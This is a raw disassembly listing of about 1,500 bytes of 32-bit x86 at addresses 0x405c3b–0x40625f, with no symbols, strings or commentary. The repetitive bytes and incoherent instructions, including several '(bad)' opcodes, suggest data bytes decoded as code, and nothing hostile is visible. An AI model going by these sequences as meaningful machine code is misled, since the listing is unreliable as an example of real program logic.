  405c3b:	00 00                	add    %al,(%eax)
  405c3d:	00 10                	add    %dl,(%eax)
  405c3f:	00 ef                	add    %ch,%bh
  405c41:	00 2f                	add    %ch,(%edi)
  405c43:	00 19                	add    %bl,(%ecx)
  405c45:	00 41 00             	add    %al,0x0(%ecx)
  405c48:	3a 00                	cmp    (%eax),%al
  405c4a:	00 00                	add    %al,(%eax)
  405c4c:	10 00                	adc    %al,(%eax)
  405c4e:	fc                   	cld
  405c4f:	00 2f                	add    %ch,(%edi)
  405c51:	00 1d 00 4f 00 4d    	add    %bl,0x4d004f00
  405c57:	00 02                	add    %al,(%edx)
  405c59:	00 10                	add    %dl,(%eax)
  405c5b:	00 07                	add    %al,(%edi)
  405c5d:	01 00                	add    %eax,(%eax)
  405c5f:	00 05 00 55 00 5a    	add    %al,0x5a005500
  405c65:	00 a0 00 00 00 19    	add    %ah,0x19000000(%eax)
  405c6b:	01 2f                	add    %ebp,(%edi)
  405c6d:	00 00                	add    %al,(%eax)
  405c6f:	00 56 00             	add    %dl,0x0(%esi)
  405c72:	6f                   	outsl  %ds:(%esi),(%dx)
  405c73:	00 00                	add    %al,(%eax)
  405c75:	00 10                	add    %dl,(%eax)
  405c77:	00 2a                	add    %ch,(%edx)
  405c79:	01 2f                	add    %ebp,(%edi)
  405c7b:	00 05 00 56 00 73    	add    %al,0x73005600
  405c81:	00 03                	add    %al,(%ebx)
  405c83:	01 10                	add    %edx,(%eax)
  405c85:	00 16                	add    %dl,(%esi)
  405c87:	1e                   	push   %ds
  405c88:	00 00                	add    %al,(%eax)
  405c8a:	05 00 58 00 7a       	add    $0x7a005800,%eax
  405c8f:	00 06                	add    %al,(%esi)
  405c91:	00 58 02             	add    %bl,0x2(%eax)
  405c94:	39 00                	cmp    %eax,(%eax)
  405c96:	06                   	push   %es
  405c97:	00 5f 02             	add    %bl,0x2(%edi)
  405c9a:	3c 00                	cmp    $0x0,%al
  405c9c:	06                   	push   %es
  405c9d:	00 6a 02             	add    %ch,0x2(%edx)
  405ca0:	3f                   	aas
  405ca1:	00 06                	add    %al,(%esi)
  405ca3:	00 79 02             	add    %bh,0x2(%ecx)
  405ca6:	3f                   	aas
  405ca7:	00 06                	add    %al,(%esi)
  405ca9:	00 88 02 3c 00 06    	add    %cl,0x6003c02(%eax)
  405caf:	06                   	push   %es
  405cb0:	92                   	xchg   %eax,%edx
  405cb1:	02 39                	add    (%ecx),%bh
  405cb3:	00 56 80             	add    %dl,-0x80(%esi)
  405cb6:	9a 02 42 00 56 80 ad 	lcall  $0xad80,$0x56004202
  405cbd:	02 42 00             	add    0x0(%edx),%al
  405cc0:	56                   	push   %esi
  405cc1:	80 bc 02 42 00 56 80 	cmpb   $0xd2,-0x7fa9ffbe(%edx,%eax,1)
  405cc8:	d2 
  405cc9:	02 42 00             	add    0x0(%edx),%al
  405ccc:	56                   	push   %esi
  405ccd:	80 e7 02             	and    $0x2,%bh
  405cd0:	42                   	inc    %edx
  405cd1:	00 56 80             	add    %dl,-0x80(%esi)
  405cd4:	fb                   	sti
  405cd5:	02 42 00             	add    0x0(%edx),%al
  405cd8:	56                   	push   %esi
  405cd9:	80 0f 03             	orb    $0x3,(%edi)
  405cdc:	42                   	inc    %edx
  405cdd:	00 56 80             	add    %dl,-0x80(%esi)
  405ce0:	1e                   	push   %ds
  405ce1:	03 42 00             	add    0x0(%edx),%eax
  405ce4:	56                   	push   %esi
  405ce5:	80 30 03             	xorb   $0x3,(%eax)
  405ce8:	42                   	inc    %edx
  405ce9:	00 56 80             	add    %dl,-0x80(%esi)
  405cec:	41                   	inc    %ecx
  405ced:	03 42 00             	add    0x0(%edx),%eax
  405cf0:	56                   	push   %esi
  405cf1:	80 53 03 42          	adcb   $0x42,0x3(%ebx)
  405cf5:	00 56 80             	add    %dl,-0x80(%esi)
  405cf8:	65 03 42 00          	add    %gs:0x0(%edx),%eax
  405cfc:	56                   	push   %esi
  405cfd:	80 6d 03 42          	subb   $0x42,0x3(%ebp)
  405d01:	00 56 80             	add    %dl,-0x80(%esi)
  405d04:	7f 03                	jg     0x405d09
  405d06:	42                   	inc    %edx
  405d07:	00 56 80             	add    %dl,-0x80(%esi)
  405d0a:	93                   	xchg   %eax,%ebx
  405d0b:	03 42 00             	add    0x0(%edx),%eax
  405d0e:	56                   	push   %esi
  405d0f:	80 a7 03 42 00 56 80 	andb   $0x80,0x56004203(%edi)
  405d16:	c3                   	ret
  405d17:	03 42 00             	add    0x0(%edx),%eax
  405d1a:	06                   	push   %es
  405d1b:	06                   	push   %es
  405d1c:	92                   	xchg   %eax,%edx
  405d1d:	02 39                	add    (%ecx),%bh
  405d1f:	00 56 80             	add    %dl,-0x80(%esi)
  405d22:	d1 03                	roll   $1,(%ebx)
  405d24:	9b                   	fwait
  405d25:	00 56 80             	add    %dl,-0x80(%esi)
  405d28:	da 03                	fiaddl (%ebx)
  405d2a:	9b                   	fwait
  405d2b:	00 56 80             	add    %dl,-0x80(%esi)
  405d2e:	ea 03 9b 00 56 80 06 	ljmp   $0x680,$0x56009b03
  405d35:	04 9b                	add    $0x9b,%al
  405d37:	00 56 80             	add    %dl,-0x80(%esi)
  405d3a:	16                   	push   %ss
  405d3b:	04 9b                	add    $0x9b,%al
  405d3d:	00 56 80             	add    %dl,-0x80(%esi)
  405d40:	31 04 9b             	xor    %eax,(%ebx,%ebx,4)
  405d43:	00 56 80             	add    %dl,-0x80(%esi)
  405d46:	4b                   	dec    %ebx
  405d47:	04 9b                	add    $0x9b,%al
  405d49:	00 56 80             	add    %dl,-0x80(%esi)
  405d4c:	63 04 9b             	arpl   %eax,(%ebx,%ebx,4)
  405d4f:	00 06                	add    %al,(%esi)
  405d51:	00 77 04             	add    %dh,0x4(%edi)
  405d54:	3f                   	aas
  405d55:	00 06                	add    %al,(%esi)
  405d57:	00 7c 04 3f          	add    %bh,0x3f(%esp,%eax,1)
  405d5b:	00 06                	add    %al,(%esi)
  405d5d:	00 85 04 3f 00 01    	add    %al,0x1003f04(%ebp)
  405d63:	00 99 04 c7 00 01    	add    %bl,0x100c704(%ecx)
  405d69:	00 ac 04 c7 00 01 00 	add    %ch,0x100c7(%esp,%eax,1)
  405d70:	5a                   	pop    %edx
  405d71:	05 f5 00 06 00       	add    $0x600f5,%eax
  405d76:	c8 07 98 01          	enter  $0x9807,$0x1
  405d7a:	06                   	push   %es
  405d7b:	00 d5                	add    %dl,%ch
  405d7d:	07                   	pop    %es
  405d7e:	9b                   	fwait
  405d7f:	01 01                	add    %eax,(%ecx)
  405d81:	00 14 08             	add    %dl,(%eax,%ecx,1)
  405d84:	c7 00 01 00 39 08    	movl   $0x8390001,(%eax)
  405d8a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405d8b:	01 01                	add    %eax,(%ecx)
  405d8d:	00 3f                	add    %bh,(%edi)
  405d8f:	08 39                	or     %bh,(%ecx)
  405d91:	00 01                	add    %al,(%ecx)
  405d93:	00 49 08             	add    %cl,0x8(%ecx)
  405d96:	39 00                	cmp    %eax,(%eax)
  405d98:	01 00                	add    %eax,(%eax)
  405d9a:	52                   	push   %edx
  405d9b:	08 98 01 01 00 7b    	or     %bl,0x7b000101(%eax)
  405da1:	08 aa 01 03 00 08    	or     %ch,0x8000301(%edx)
  405da7:	09 d7                	or     %edx,%edi
  405da9:	01 03                	add    %eax,(%ebx)
  405dab:	00 13                	add    %dl,(%ebx)
  405dad:	09 d7                	or     %edx,%edi
  405daf:	01 03                	add    %eax,(%ebx)
  405db1:	00 28                	add    %ch,(%eax)
  405db3:	09 db                	or     %ebx,%ebx
  405db5:	01 03                	add    %eax,(%ebx)
  405db7:	00 37                	add    %dh,(%edi)
  405db9:	09 d7                	or     %edx,%edi
  405dbb:	01 03                	add    %eax,(%ebx)
  405dbd:	00 47 09             	add    %al,0x9(%edi)
  405dc0:	d7                   	xlat   %ds:(%ebx)
  405dc1:	01 03                	add    %eax,(%ebx)
  405dc3:	00 53 09             	add    %dl,0x9(%ebx)
  405dc6:	39 00                	cmp    %eax,(%eax)
  405dc8:	03 00                	add    (%eax),%eax
  405dca:	5e                   	pop    %esi
  405dcb:	09 39                	or     %edi,(%ecx)
  405dcd:	00 03                	add    %al,(%ebx)
  405dcf:	00 6f 09             	add    %ch,0x9(%edi)
  405dd2:	39 00                	cmp    %eax,(%eax)
  405dd4:	06                   	push   %es
  405dd5:	06                   	push   %es
  405dd6:	92                   	xchg   %eax,%edx
  405dd7:	02 ef                	add    %bh,%ch
  405dd9:	01 56 80             	add    %edx,-0x80(%esi)
  405ddc:	c5 09                	lds    (%ecx),%ecx
  405dde:	f2 01 56 80          	repnz add %edx,-0x80(%esi)
  405de2:	d7                   	xlat   %ds:(%ebx)
  405de3:	09 f2                	or     %esi,%edx
  405de5:	01 56 80             	add    %edx,-0x80(%esi)
  405de8:	e6 09                	out    %al,$0x9
  405dea:	f2 01 56 80          	repnz add %edx,-0x80(%esi)
  405dee:	f5                   	cmc
  405def:	09 f2                	or     %esi,%edx
  405df1:	01 56 80             	add    %edx,-0x80(%esi)
  405df4:	04 0a                	add    $0xa,%al
  405df6:	f2 01 06             	repnz add %eax,(%esi)
  405df9:	06                   	push   %es
  405dfa:	92                   	xchg   %eax,%edx
  405dfb:	02 ef                	add    %bh,%ch
  405dfd:	01 56 80             	add    %edx,-0x80(%esi)
  405e00:	15 0a 00 02 56       	adc    $0x5602000a,%eax
  405e05:	80 26 0a             	andb   $0xa,(%esi)
  405e08:	00 02                	add    %al,(%edx)
  405e0a:	56                   	push   %esi
  405e0b:	80 38 0a             	cmpb   $0xa,(%eax)
  405e0e:	00 02                	add    %al,(%edx)
  405e10:	01 00                	add    %eax,(%eax)
  405e12:	49                   	dec    %ecx
  405e13:	0a 13                	or     (%ebx),%dl
  405e15:	02 06                	add    (%esi),%al
  405e17:	00 4f 0a             	add    %cl,0xa(%edi)
  405e1a:	c7 00 06 00 64 0a    	movl   $0xa640006,(%eax)
  405e20:	c7 00 06 00 79 0a    	movl   $0xa790006,(%eax)
  405e26:	c7 00 06 00 90 0a    	movl   $0xa900006,(%eax)
  405e2c:	c7 00 06 00 a7 0a    	movl   $0xaa70006,(%eax)
  405e32:	c7 00 06 00 bc 0a    	movl   $0xabc0006,(%eax)
  405e38:	c7 00 06 00 d1 0a    	movl   $0xad10006,(%eax)
  405e3e:	c7 00 06 00 e8 0a    	movl   $0xae80006,(%eax)
  405e44:	c7 00 06 00 ff 0a    	movl   $0xaff0006,(%eax)
  405e4a:	c7 00 06 00 17 0b    	movl   $0xb170006,(%eax)
  405e50:	c7 00 01 00 98 0b    	movl   $0xb980001,(%eax)
  405e56:	3f                   	aas
  405e57:	00 01                	add    %al,(%ecx)
  405e59:	00 a3 0b 3f 00 06    	add    %ah,0x6003f0b(%ebx)
  405e5f:	00 25 0c 63 02 01    	add    %ah,0x102630c
  405e65:	00 5e 0c             	add    %bl,0xc(%esi)
  405e68:	73 02                	jae    0x405e6c
  405e6a:	01 00                	add    %eax,(%eax)
  405e6c:	65 0c 77             	gs or  $0x77,%al
  405e6f:	02 01                	add    (%ecx),%al
  405e71:	00 89 0c 7b 02 01    	add    %cl,0x1027b0c(%ecx)
  405e77:	00 9d 0c 7b 02 01    	add    %bl,0x1027b0c(%ebp)
  405e7d:	00 b8 0c 80 02 01    	add    %bh,0x102800c(%eax)
  405e83:	00 cd                	add    %cl,%ch
  405e85:	0c 92                	or     $0x92,%al
  405e87:	02 01                	add    (%ecx),%al
  405e89:	00 d7                	add    %dl,%bh
  405e8b:	0d 77 02 01 00       	or     $0x10277,%eax
  405e90:	37                   	aaa
  405e91:	10 98 01 01 00 42    	adc    %bl,0x42000101(%eax)
  405e97:	10 39                	adc    %bh,(%ecx)
  405e99:	00 06                	add    %al,(%esi)
  405e9b:	00 65 0c             	add    %ah,0xc(%ebp)
  405e9e:	77 02                	ja     0x405ea2
  405ea0:	06                   	push   %es
  405ea1:	00 3a                	add    %bh,(%edx)
  405ea3:	1e                   	push   %ds
  405ea4:	81 06 00 00 00 00    	addl   $0x0,(%esi)
  405eaa:	80 00 91             	addb   $0x91,(%eax)
  405ead:	20 fd                	and    %bh,%ch
  405eaf:	01 13                	add    %edx,(%ebx)
  405eb1:	00 01                	add    %al,(%ecx)
  405eb3:	00 50 20             	add    %dl,0x20(%eax)
  405eb6:	00 00                	add    %al,(%eax)
  405eb8:	00 00                	add    %al,(%eax)
  405eba:	93                   	xchg   %eax,%ebx
  405ebb:	00 40 02             	add    %al,0x2(%eax)
  405ebe:	28 00                	sub    %al,(%eax)
  405ec0:	0b 00                	or     (%eax),%eax
  405ec2:	2a 21                	sub    (%ecx),%ah
  405ec4:	00 00                	add    %al,(%eax)
  405ec6:	00 00                	add    %al,(%eax)
  405ec8:	86 18                	xchg   %bl,(%eax)
  405eca:	52                   	push   %edx
  405ecb:	02 35 00 11 00 32    	add    0x32001100,%dh
  405ed1:	21 00                	and    %eax,(%eax)
  405ed3:	00 00                	add    %al,(%eax)
  405ed5:	00 86 18 52 02 35    	add    %al,0x35025218(%esi)
  405edb:	00 11                	add    %dl,(%ecx)
  405edd:	00 5b 21             	add    %bl,0x21(%ebx)
  405ee0:	00 00                	add    %al,(%eax)
  405ee2:	00 00                	add    %al,(%eax)
  405ee4:	c6                   	(bad)
  405ee5:	08 bf 04 cb 00 11    	or     %bh,0x1100cb04(%edi)
  405eeb:	00 63 21             	add    %ah,0x21(%ebx)
  405eee:	00 00                	add    %al,(%eax)
  405ef0:	00 00                	add    %al,(%eax)
  405ef2:	c6                   	(bad)
  405ef3:	08 d3                	or     %dl,%bl
  405ef5:	04 d0                	add    $0xd0,%al
  405ef7:	00 11                	add    %dl,(%ecx)
  405ef9:	00 6c 21 00          	add    %ch,0x0(%ecx,%eiz,1)
  405efd:	00 00                	add    %al,(%eax)
  405eff:	00 c6                	add    %al,%dh
  405f01:	08 ec                	or     %ch,%ah
  405f03:	04 d6                	add    $0xd6,%al
  405f05:	00 12                	add    %dl,(%edx)
  405f07:	00 77 21             	add    %dh,0x21(%edi)
  405f0a:	00 00                	add    %al,(%eax)
  405f0c:	00 00                	add    %al,(%eax)
  405f0e:	c6                   	(bad)
  405f0f:	08 fb                	or     %bh,%bl
  405f11:	04 db                	add    $0xdb,%al
  405f13:	00 12                	add    %dl,(%edx)
  405f15:	00 79 21             	add    %bh,0x21(%ecx)
  405f18:	00 00                	add    %al,(%eax)
  405f1a:	00 00                	add    %al,(%eax)
  405f1c:	c6                   	(bad)
  405f1d:	08 16                	or     %dl,(%esi)
  405f1f:	05 e1 00 13 00       	add    $0x1300e1,%eax
  405f24:	82 21 00             	andb   $0x0,(%ecx)
  405f27:	00 00                	add    %al,(%eax)
  405f29:	00 c6                	add    %al,%dh
  405f2b:	08 29                	or     %ch,(%ecx)
  405f2d:	05 e6 00 13 00       	add    $0x1300e6,%eax
  405f32:	84 21                	test   %ah,(%ecx)
  405f34:	00 00                	add    %al,(%eax)
  405f36:	00 00                	add    %al,(%eax)
  405f38:	c6                   	(bad)
  405f39:	08 3c 05 ec 00 14 00 	or     %bh,0x1400ec(,%eax,1)
  405f40:	88 21                	mov    %ah,(%ecx)
  405f42:	00 00                	add    %al,(%eax)
  405f44:	00 00                	add    %al,(%eax)
  405f46:	c6                   	(bad)
  405f47:	08 4b 05             	or     %cl,0x5(%ebx)
  405f4a:	f0 00 14 00          	lock add %dl,(%eax,%eax,1)
  405f4e:	8c 21                	mov    %fs,(%ecx)
  405f50:	00 00                	add    %al,(%eax)
  405f52:	00 00                	add    %al,(%eax)
  405f54:	c6 00 69             	movb   $0x69,(%eax)
  405f57:	05 35 00 15 00       	add    $0x150035,%eax
  405f5c:	eb 21                	jmp    0x405f7f
  405f5e:	00 00                	add    %al,(%eax)
  405f60:	00 00                	add    %al,(%eax)
  405f62:	c6                   	(bad)
  405f63:	08 7a 05             	or     %bh,0x5(%edx)
  405f66:	cb                   	lret
  405f67:	00 15 00 f3 21 00    	add    %dl,0x21f300
  405f6d:	00 00                	add    %al,(%eax)
  405f6f:	00 c6                	add    %al,%dh
  405f71:	08 8e 05 d0 00 15    	or     %cl,0x1500d005(%esi)
  405f77:	00 fc                	add    %bh,%ah
  405f79:	21 00                	and    %eax,(%eax)
  405f7b:	00 00                	add    %al,(%eax)
  405f7d:	00 c6                	add    %al,%dh
  405f7f:	00 b7 05 f9 00 16    	add    %dh,0x1600f905(%edi)
  405f85:	00 87 22 00 00 00    	add    %al,0x22(%edi)
  405f8b:	00 c6                	add    %al,%dh
  405f8d:	08 c9                	or     %cl,%cl
  405f8f:	05 06 01 17 00       	add    $0x170106,%eax
  405f94:	8a 22                	mov    (%edx),%ah
  405f96:	00 00                	add    %al,(%eax)
  405f98:	00 00                	add    %al,(%eax)
  405f9a:	c6                   	(bad)
  405f9b:	08 da                	or     %bl,%dl
  405f9d:	05 d6 00 17 00       	add    $0x1700d6,%eax
  405fa2:	98                   	cwtl
  405fa3:	22 00                	and    (%eax),%al
  405fa5:	00 00                	add    %al,(%eax)
  405fa7:	00 c6                	add    %al,%dh
  405fa9:	08 f4                	or     %dh,%ah
  405fab:	05 d6 00 17 00       	add    $0x1700d6,%eax
  405fb0:	a3 22 00 00 00       	mov    %eax,0x22
  405fb5:	00 c6                	add    %al,%dh
  405fb7:	00 1d 06 0a 01 17    	add    %bl,0x17010a06
  405fbd:	00 cb                	add    %cl,%bl
  405fbf:	22 00                	and    (%eax),%al
  405fc1:	00 00                	add    %al,(%eax)
  405fc3:	00 c6                	add    %al,%dh
  405fc5:	00 25 06 11 01 18    	add    %ah,0x18011106
  405fcb:	00 cd                	add    %cl,%ch
  405fcd:	22 00                	and    (%eax),%al
  405fcf:	00 00                	add    %al,(%eax)
  405fd1:	00 c6                	add    %al,%dh
  405fd3:	00 3a                	add    %bh,(%edx)
  405fd5:	06                   	push   %es
  405fd6:	1d 01 1c 00 cf       	sbb    $0xcf001c01,%eax
  405fdb:	22 00                	and    (%eax),%al
  405fdd:	00 00                	add    %al,(%eax)
  405fdf:	00 c6                	add    %al,%dh
  405fe1:	00 3a                	add    %bh,(%edx)
  405fe3:	06                   	push   %es
  405fe4:	25 01 1e 00 d4       	and    $0xd4001e01,%eax
  405fe9:	22 00                	and    (%eax),%al
  405feb:	00 00                	add    %al,(%eax)
  405fed:	00 c6                	add    %al,%dh
  405fef:	08 4c 06 e1          	or     %cl,-0x1f(%esi,%eax,1)
  405ff3:	00 20                	add    %ah,(%eax)
  405ff5:	00 fa                	add    %bh,%dl
  405ff7:	22 00                	and    (%eax),%al
  405ff9:	00 00                	add    %al,(%eax)
  405ffb:	00 c6                	add    %al,%dh
  405ffd:	08 5f 06             	or     %bl,0x6(%edi)
  406000:	e6 00                	out    %al,$0x0
  406002:	20 00                	and    %al,(%eax)
  406004:	fc                   	cld
  406005:	22 00                	and    (%eax),%al
  406007:	00 00                	add    %al,(%eax)
  406009:	00 c6                	add    %al,%dh
  40600b:	08 72 06             	or     %dh,0x6(%edx)
  40600e:	d6                   	salc
  40600f:	00 21                	add    %ah,(%ecx)
  406011:	00 24 23             	add    %ah,(%ebx,%eiz,1)
  406014:	00 00                	add    %al,(%eax)
  406016:	00 00                	add    %al,(%eax)
  406018:	c6                   	(bad)
  406019:	08 81 06 db 00 21    	or     %al,0x2100db06(%ecx)
  40601f:	00 26                	add    %ah,(%esi)
  406021:	23 00                	and    (%eax),%eax
  406023:	00 00                	add    %al,(%eax)
  406025:	00 c6                	add    %al,%dh
  406027:	08 90 06 33 01 22    	or     %dl,0x22013306(%eax)
  40602d:	00 32                	add    %dh,(%edx)
  40602f:	23 00                	and    (%eax),%eax
  406031:	00 00                	add    %al,(%eax)
  406033:	00 c6                	add    %al,%dh
  406035:	08 a0 06 37 01 22    	or     %ah,0x22013706(%eax)
  40603b:	00 34 23             	add    %dh,(%ebx,%eiz,1)
  40603e:	00 00                	add    %al,(%eax)
  406040:	00 00                	add    %al,(%eax)
  406042:	86 18                	xchg   %bl,(%eax)
  406044:	52                   	push   %edx
  406045:	02 35 00 23 00 00    	add    0x2300,%dh
  40604b:	00 00                	add    %al,(%eax)
  40604d:	00 80 00 91 20 4c    	add    %al,0x4c209100(%eax)
  406053:	07                   	pop    %es
  406054:	57                   	push   %edi
  406055:	01 23                	add    %esp,(%ebx)
  406057:	00 44 23 00          	add    %al,0x0(%ebx,%eiz,1)
  40605b:	00 00                	add    %al,(%eax)
  40605d:	00 96 00 66 07 5c    	add    %dl,0x5c076600(%esi)
  406063:	01 24 00             	add    %esp,(%eax,%eax,1)
  406066:	b4 25                	mov    $0x25,%ah
  406068:	00 00                	add    %al,(%eax)
  40606a:	00 00                	add    %al,(%eax)
  40606c:	96                   	xchg   %eax,%esi
  40606d:	00 66 07             	add    %ah,0x7(%esi)
  406070:	66 01 28             	add    %bp,(%eax)
  406073:	00 bf 25 00 00 00    	add    %bh,0x25(%edi)
  406079:	00 86 18 52 02 35    	add    %al,0x35025218(%esi)
  40607f:	00 2b                	add    %ch,(%ebx)
  406081:	00 c8                	add    %cl,%al
  406083:	25 00 00 00 00       	and    $0x0,%eax
  406088:	96                   	xchg   %eax,%esi
  406089:	00 66 07             	add    %ah,0x7(%esi)
  40608c:	6f                   	outsl  %ds:(%esi),(%dx)
  40608d:	01 2b                	add    %ebp,(%ebx)
  40608f:	00 f8                	add    %bh,%al
  406091:	28 00                	sub    %al,(%eax)
  406093:	00 00                	add    %al,(%eax)
  406095:	00 86 18 52 02 35    	add    %al,0x35025218(%esi)
  40609b:	00 2f                	add    %ch,(%edi)
  40609d:	00 00                	add    %al,(%eax)
  40609f:	00 00                	add    %al,(%eax)
  4060a1:	00 80 00 96 20 a9    	add    %al,-0x56df6a00(%eax)
  4060a7:	07                   	pop    %es
  4060a8:	7c 01                	jl     0x4060ab
  4060aa:	2f                   	das
  4060ab:	00 00                	add    %al,(%eax)
  4060ad:	29 00                	sub    %eax,(%eax)
  4060af:	00 00                	add    %al,(%eax)
  4060b1:	00 91 00 b8 07 88    	add    %dl,-0x77f84800(%ecx)
  4060b7:	01 35 00 5c 29 00    	add    %esi,0x295c00
  4060bd:	00 00                	add    %al,(%eax)
  4060bf:	00 96 00 66 07 90    	add    %dl,-0x6ff89a00(%esi)
  4060c5:	01 38                	add    %edi,(%eax)
  4060c7:	00 7c 2a 00          	add    %bh,0x0(%edx,%ebp,1)
  4060cb:	00 00                	add    %al,(%eax)
  4060cd:	00 86 18 52 02 35    	add    %al,0x35025218(%esi)
  4060d3:	00 3b                	add    %bh,(%ebx)
  4060d5:	00 84 2a 00 00 00 00 	add    %al,0x0(%edx,%ebp,1)
  4060dc:	86 18                	xchg   %bl,(%eax)
  4060de:	52                   	push   %edx
  4060df:	02 35 00 3b 00 e0    	add    0xe0003b00,%dh
  4060e5:	2a 00                	sub    (%eax),%al
  4060e7:	00 00                	add    %al,(%eax)
  4060e9:	00 81 00 ea 07 9f    	add    %al,-0x60f81600(%ecx)
  4060ef:	01 3b                	add    %edi,(%ebx)
  4060f1:	00 1c 2c             	add    %bl,(%esp,%ebp,1)
  4060f4:	00 00                	add    %al,(%eax)
  4060f6:	00 00                	add    %al,(%eax)
  4060f8:	81 00 00 08 9f 01    	addl   $0x19f0800,(%eax)
  4060fe:	3d 00 58 2d 00       	cmp    $0x2d5800,%eax
  406103:	00 00                	add    %al,(%eax)
  406105:	00 81 00 a1 08 bb    	add    %al,-0x44f75f00(%ecx)
  40610b:	01 3f                	add    %edi,(%edi)
  40610d:	00 40 2e             	add    %al,0x2e(%eax)
  406110:	00 00                	add    %al,(%eax)
  406112:	00 00                	add    %al,(%eax)
  406114:	81 00 ae 08 35 00    	addl   $0x3508ae,(%eax)
  40611a:	40                   	inc    %eax
  40611b:	00 14 2f             	add    %dl,(%edi,%ebp,1)
  40611e:	00 00                	add    %al,(%eax)
  406120:	00 00                	add    %al,(%eax)
  406122:	81 00 d3 08 c2 01    	addl   $0x1c208d3,(%eax)
  406128:	40                   	inc    %eax
  406129:	00 90 2f 00 00 00    	add    %dl,0x2f(%eax)
  40612f:	00 81 00 dc 08 c9    	add    %al,-0x36f72400(%ecx)
  406135:	01 42 00             	add    %eax,0x0(%edx)
  406138:	1f                   	pop    %ds
  406139:	32 00                	xor    (%eax),%al
  40613b:	00 00                	add    %al,(%eax)
  40613d:	00 86 00 e3 08 ec    	add    %al,-0x13f71d00(%esi)
  406143:	00 44 00 2c          	add    %al,0x2c(%eax,%eax,1)
  406147:	32 00                	xor    (%eax),%al
  406149:	00 00                	add    %al,(%eax)
  40614b:	00 86 18 52 02 35    	add    %al,0x35025218(%esi)
  406151:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  406155:	32 00                	xor    (%eax),%al
  406157:	00 00                	add    %al,(%eax)
  406159:	00 86 18 52 02 d0    	add    %al,-0x2ffdade8(%esi)
  40615f:	00 44 00 a8          	add    %al,-0x58(%eax,%eax,1)
  406163:	32 00                	xor    (%eax),%al
  406165:	00 00                	add    %al,(%eax)
  406167:	00 86 00 fb 08 d1    	add    %al,-0x2ef70500(%esi)
  40616d:	01 45 00             	add    %eax,0x0(%ebp)
  406170:	00 00                	add    %al,(%eax)
  406172:	00 00                	add    %al,(%eax)
  406174:	80 00 91             	addb   $0x91,(%eax)
  406177:	20 75 09             	and    %dh,0x9(%ebp)
  40617a:	df 01                	filds  (%ecx)
  40617c:	46                   	inc    %esi
  40617d:	00 00                	add    %al,(%eax)
  40617f:	00 00                	add    %al,(%eax)
  406181:	00 80 00 91 20 82    	add    %al,-0x7ddf6f00(%eax)
  406187:	09 e5                	or     %esp,%ebp
  406189:	01 47 00             	add    %eax,0x0(%edi)
  40618c:	f0 3a 00             	lock cmp (%eax),%al
  40618f:	00 00                	add    %al,(%eax)
  406191:	00 96 00 8e 09 eb    	add    %dl,-0x14f67200(%esi)
  406197:	01 48 00             	add    %ecx,0x0(%eax)
  40619a:	18 3b                	sbb    %bh,(%ebx)
  40619c:	00 00                	add    %al,(%eax)
  40619e:	00 00                	add    %al,(%eax)
  4061a0:	96                   	xchg   %eax,%esi
  4061a1:	00 a0 09 eb 01 48    	add    %ah,0x4801eb09(%eax)
  4061a7:	00 40 3b             	add    %al,0x3b(%eax)
  4061aa:	00 00                	add    %al,(%eax)
  4061ac:	00 00                	add    %al,(%eax)
  4061ae:	96                   	xchg   %eax,%esi
  4061af:	00 b3 09 eb 01 48    	add    %dh,0x4801eb09(%ebx)
  4061b5:	00 66 3b             	add    %ah,0x3b(%esi)
  4061b8:	00 00                	add    %al,(%eax)
  4061ba:	00 00                	add    %al,(%eax)
  4061bc:	86 18                	xchg   %bl,(%eax)
  4061be:	52                   	push   %edx
  4061bf:	02 35 00 48 00 70    	add    0x70004800,%dh
  4061c5:	3b 00                	cmp    (%eax),%eax
  4061c7:	00 00                	add    %al,(%eax)
  4061c9:	00 86 18 52 02 35    	add    %al,0x35025218(%esi)
  4061cf:	00 48 00             	add    %cl,0x0(%eax)
  4061d2:	bc 3b 00 00 00       	mov    $0x3b,%esp
  4061d7:	00 c6                	add    %al,%dh
  4061d9:	00 56 0b             	add    %dl,0xb(%esi)
  4061dc:	17                   	pop    %ss
  4061dd:	02 48 00             	add    0x0(%eax),%cl
  4061e0:	70 3f                	jo     0x406221
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	c6 00 5d             	movb   $0x5d,(%eax)
  4061e9:	0b 2a                	or     (%edx),%ebp
  4061eb:	02 4b 00             	add    0x0(%ebx),%cl
  4061ee:	90                   	nop
  4061ef:	3f                   	aas
  4061f0:	00 00                	add    %al,(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	c6 00 7a             	movb   $0x7a,(%eax)
  4061f7:	0b 37                	or     (%edi),%esi
  4061f9:	02 4f 00             	add    0x0(%edi),%cl
  4061fc:	f0 3f                	lock aas
  4061fe:	00 00                	add    %al,(%eax)
  406200:	00 00                	add    %al,(%eax)
  406202:	c6 00 7a             	movb   $0x7a,(%eax)
  406205:	0b 45 02             	or     0x2(%ebp),%eax
  406208:	55                   	push   %ebp
  406209:	00 4b 40             	add    %cl,0x40(%ebx)
  40620c:	00 00                	add    %al,(%eax)
  40620e:	00 00                	add    %al,(%eax)
  406210:	c6                   	(bad)
  406211:	08 8e 0b 4f 02 59    	or     %cl,0x59024f0b(%esi)
  406217:	00 54 40 00          	add    %dl,0x0(%eax,%eax,2)
  40621b:	00 00                	add    %al,(%eax)
  40621d:	00 c6                	add    %al,%dh
  40621f:	00 ae 0b 33 01 59    	add    %ch,0x5901330b(%esi)
  406225:	00 84 40 00 00 00 00 	add    %al,0x0(%eax,%eax,2)
  40622c:	81 00 d4 0b 54 02    	addl   $0x2540bd4,(%eax)
  406232:	59                   	pop    %ecx
  406233:	00 00                	add    %al,(%eax)
  406235:	41                   	inc    %ecx
  406236:	00 00                	add    %al,(%eax)
  406238:	00 00                	add    %al,(%eax)
  40623a:	c6 00 e0             	movb   $0xe0,(%eax)
  40623d:	0b 54 02 59          	or     0x59(%edx,%eax,1),%edx
  406241:	00 58 41             	add    %bl,0x41(%eax)
  406244:	00 00                	add    %al,(%eax)
  406246:	00 00                	add    %al,(%eax)
  406248:	c6 00 f7             	movb   $0xf7,(%eax)
  40624b:	0b 5a 02             	or     0x2(%edx),%ebx
  40624e:	59                   	pop    %ecx
  40624f:	00 5a 41             	add    %bl,0x41(%edx)
  406252:	00 00                	add    %al,(%eax)
  406254:	00 00                	add    %al,(%eax)
  406256:	c6 00 f7             	movb   $0xf7,(%eax)
  406259:	0b 37                	or     (%edi),%esi
  40625b:	01 5c 00 5c          	add    %ebx,0x5c(%eax,%eax,1)
  40625f:	41                   	inc    %ecx
